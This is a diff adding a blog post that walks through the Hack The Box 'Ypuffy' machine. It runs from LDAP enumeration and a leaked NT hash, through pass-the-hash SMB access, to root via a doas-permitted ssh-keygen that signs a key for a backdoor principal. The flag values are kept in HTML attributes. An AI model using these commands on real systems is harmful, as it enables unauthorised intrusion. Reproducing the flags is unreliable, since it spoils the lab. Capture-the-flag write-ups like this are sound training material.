@@ -1,0 +1,303 @@
+---
+layout: default
+title: Ypuffy
+---
+
+<div class="pretty-font">
+<h1>Ypuffy</h1>
+<p class="date">09/02/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/ypuffy/ypuffy.png">
+
+<p>To get user on Ypuffy we will have to make some simple enumeration with <code>ldap</code> and <code>SMB</code>, then work with <code>PuTTY</code> private keys to access the machine. To get root, we will play with OpenBSD commands and understand how some ssh configuration works.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>Running <code>nmap</code> listing versions and executing default scripts we can see a bunch of ports open.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/ypuffy# nmap -sC -sV 10.10.10.107
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-20 11:55 UTC
+Nmap scan report for 10.10.10.107
+Host is up (0.15s latency).
+Not shown: 995 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA)
+|   256 dd:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 (ECDSA)
+|_  256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 (ED25519)
+80/tcp  open  http        OpenBSD httpd
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YPUFFY)
+389/tcp open  ldap        (Anonymous bind OK)
+445/tcp open  netbios-ssn Samba smbd 4.7.6 (workgroup: YPUFFY)
+Service Info: Host: YPUFFY
+
+Host script results:
+|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6)
+|   Computer name: ypuffy
+|   NetBIOS computer name: YPUFFY\x00
+|   Domain name: hackthebox.htb
+|   FQDN: ypuffy.hackthebox.htb
+|_  System time: 2019-01-20T06:56:17-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-01-20 11:56:17
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.71 seconds
+</pre>
+
+<p>Since we have <code>ldap</code> open to everyone, retrieve its info using nmap's <code>ldap-search</code> script.</p>
+
+<pre class="prettyprint long">
+root@kali:~/htb/ypuffy# nmap -p 389 --script ldap-search 10.10.10.107
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-20 12:19 UTC
+Nmap scan report for 10.10.10.107
+Host is up (0.070s latency).
+
+PORT    STATE SERVICE
+389/tcp open  ldap
+| ldap-search: 
+|   Context: dc=hackthebox,dc=htb
+|     dn: dc=hackthebox,dc=htb
+|         dc: hackthebox
+|         objectClass: top
+|         objectClass: domain
+|     dn: ou=passwd,dc=hackthebox,dc=htb
+|         ou: passwd
+|         objectClass: top
+|         objectClass: organizationalUnit
+|     dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
+|         uid: bob8791
+|         cn: Bob
+|         objectClass: account
+|         objectClass: posixAccount
+|         objectClass: top
+|         userPassword: {BSDAUTH}bob8791
+|         uidNumber: 5001
+|         gidNumber: 5001
+|         gecos: Bob
+|         homeDirectory: /home/bob8791
+|         loginShell: /bin/ksh
+|     dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
+|         uid: alice1978
+|         cn: Alice
+|         objectClass: account
+|         objectClass: posixAccount
+|         objectClass: top
+|         objectClass: sambaSamAccount
+|         userPassword: {BSDAUTH}alice1978
+|         uidNumber: 5000
+|         gidNumber: 5000
+|         gecos: Alice
+|         homeDirectory: /home/alice1978
+|         loginShell: /bin/ksh
+|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
+|         displayName: Alice
+|         sambaAcctFlags: [U          ]
+|         sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
+|         sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
+|         sambaPwdLastSet: 1532916644
+|     dn: ou=group,dc=hackthebox,dc=htb
+|         ou: group
+|         objectClass: top
+|         objectClass: organizationalUnit
+|     dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
+|         objectClass: posixGroup
+|         objectClass: top
+|         cn: bob8791
+|         userPassword: {crypt}*
+|         gidNumber: 5001
+|     dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
+|         objectClass: posixGroup
+|         objectClass: top
+|         cn: alice1978
+|         userPassword: {crypt}*
+|         gidNumber: 5000
+|     dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
+|         sambaDomainName: YPUFFY
+|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464
+|         sambaAlgorithmicRidBase: 1000
+|         objectclass: sambaDomain
+|         sambaNextUserRid: 1000
+|         sambaMinPwdLength: 5
+|         sambaPwdHistoryLength: 0
+|         sambaLogonToChgPwd: 0
+|         sambaMaxPwdAge: -1
+|         sambaMinPwdAge: 0
+|         sambaLockoutDuration: 30
+|         sambaLockoutObservationWindow: 30
+|         sambaLockoutThreshold: 0
+|         sambaForceLogoff: -1
+|         sambaRefuseMachinePwdChange: 0
+|_        sambaNextRid: 1001
+
+Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
+</pre>
+
+<p>We can see on the obtained info that we have a user <code>alice1978</code> with its NT Hash (<code>0B186E661BBDBDCF6047784DE8B9FD8B</code>). We can use this info to connect through SMB.</p>
+
+<p>Using those credentials we're going to list all SMB shares available to this user to see where we can go.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/ypuffy# smbmap -u alice1978 -d YPUFFY -p 0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B -H 10.10.10.107
+[+] Finding open SMB ports....
+[+] Hash detected, using pass-the-hash to authentiate
+[+] User session establishd on 10.10.10.107...
+[+] IP: 10.10.10.107:445	Name: 10.10.10.107                                      
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	alice                                             	READ, WRITE
+	IPC$                                              	NO ACCESS
+</pre>
+
+<p>Connect to <code>alice</code> share through <code>smbclient</code> as we have seen we have <code>READ, WRITE</code> permissions.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/ypuffy# smbclient -U alice1978 --pw-nt-hash //10.10.10.107/alice 0B186E661BBDBDCF6047784DE8B9FD8B
+Try "help" to get a list of possible commands.
+smb: \> 
+</pre>
+
+<p>The only file we can find there is a <code>.ppk</code>.</p>
+
+<pre class="prettyprint">
+smb: \> dir
+  .                                   D        0  Tue Jan 22 11:09:16 2019
+  ..                                  D        0  Tue Jan 22 11:04:42 2019
+  my_private_key.ppk                  A     1460  Tue Jul 17 01:38:51 2018
+
+		433262 blocks of size 1024. 411468 blocks available
+smb: \> get my_private_key.ppk 
+getting file \my_private_key.ppk of size 1460 as my_private_key.ppk (3.0 KiloBytes/sec) (average 3.0 KiloBytes/sec)
+</pre>
+
+<p>A <code>.ppk</code> file is a <code>PuTTY</code> private key and since we are going to use Openssh, transform it using <code>puttygen</code>.</p> 
+
+<pre class="prettyprint">
+root@kali:~/htb/ypuffy# puttygen my_private_key.ppk -O private-openssh -o alice.key
+</pre>
+
+<p>Now we can connect as <code>alice1978</code> with the obtained key to the machine.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/ypuffy# ssh -i alice.key alice1978@10.10.10.107
+OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018
+
+Welcome to OpenBSD: The proactively secure Unix-like operating system.
+
+Please use the sendbug(1) utility to report bugs in the system.
+Before reporting a bug, please try to reproduce it with the latest
+version of the code.  With bug reports, please try to ensure that
+enough information to reproduce the problem is enclosed, and if a
+known fix for it exists, include that as well.
+
+ypuffy$
+</pre>
+
+<p>We have <code>user.txt</code> under alice's documents.</p>
+
+<pre class="prettyprint">
+ypuffy$ cat user.txt
+<span flag="acbc06eb2982b14c2756b6c6e3767aab">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>This machine is running OpenBSD. In this kind of operating system, instead of using <code>sudo</code>, the tool to execute commands as another user is <code>doas</code>.</p>
+
+<p>Here we can see the configuration file, where alice is configured to be able to run <code>ssh-keygen</code> as userca without providing a password.</p>
+
+<pre class="prettyprint">
+ypuffy$ cat /etc/doas.conf                                                                                                                                           
+permit keepenv :wheel
+permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
+</pre>
+
+<p>On the other hand, on the ssh configuration file we have the following settings.</p>
+
+<pre class="prettyprint">
+ypuffy$ cat /etc/ssh/sshd_config
+...
+AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&username=%u
+AuthorizedKeysCommandUser nobody
+
+TrustedUserCAKeys /home/userca/ca.pub
+AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&username=%u
+AuthorizedPrincipalsCommandUser nobody
+...
+</pre>
+
+<p>Notice the <code>ca.pub</code> public key is trusted.</p>
+
+<p>In the <code>AuthorizedPrincipalsCommand</code> variable there's a <code>curl</code> request to some local URL. If we try to replicate it, we get the following response.</p>
+
+<pre class="prettyprint">
+ypuffy$ curl "http://127.0.0.1/sshauth?type=principals&username=root"  
+3m3rgencyB4ckd00r
+</pre>
+
+<p>Once we have all that info, we are going to try to escalate privileges taking advantage of the <code>doas</code> configuration to use <code>ssh-keygen</code> as <code>userca</code> to create a valid key pair to ssh as root.</p>
+
+<p>First of all we're going to create a RSA key pair as alice.</p>
+
+<pre class="prettyprint">
+ypuffy$ ssh-keygen -t rsa -f /tmp/key
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /tmp/key.
+Your public key has been saved in /tmp/key.pub.
+</pre>
+
+<p>Next, we have to sign our public key as <code>userca</code> with its private key <code>ca</code> which we saw was trusted. We also have to select the principal <code>3m3rgencyB4ckd00r</code> as we saw on the configuration file.</p>
+
+<pre class="prettyprint">
+ypuffy$ doas -u userca /usr/bin/ssh-keygen -I caca -n 3m3rgencyB4ckd00r -s /home/userca/ca /tmp/key.pub   
+Signed user key /tmp/key-cert.pub: id "caca" serial 0 for 3m3rgencyB4ckd00r valid forever
+</pre>
+
+<p>Now our key pair is trusted and we can connect as root using the generated private key.</p>
+
+<pre class="prettyprint">
+ypuffy$ ssh -i /tmp/key root@10.10.10.107
+OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018
+
+Welcome to OpenBSD: The proactively secure Unix-like operating system.
+
+Please use the sendbug(1) utility to report bugs in the system.
+Before reporting a bug, please try to reproduce it with the latest
+version of the code.  With bug reports, please try to ensure that
+enough information to reproduce the problem is enclosed, and if a
+known fix for it exists, include that as well.
+
+ypuffy# whoami                                                                  
+root
+</pre>
+
+<p>The flag is under root's directory.</p>
+
+<pre class="prettyprint">
+ypuffy# cat /root/root.txt
+<span flag="1265f8e0a1984edd9dc1b6c3fcd1757f">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+</div>
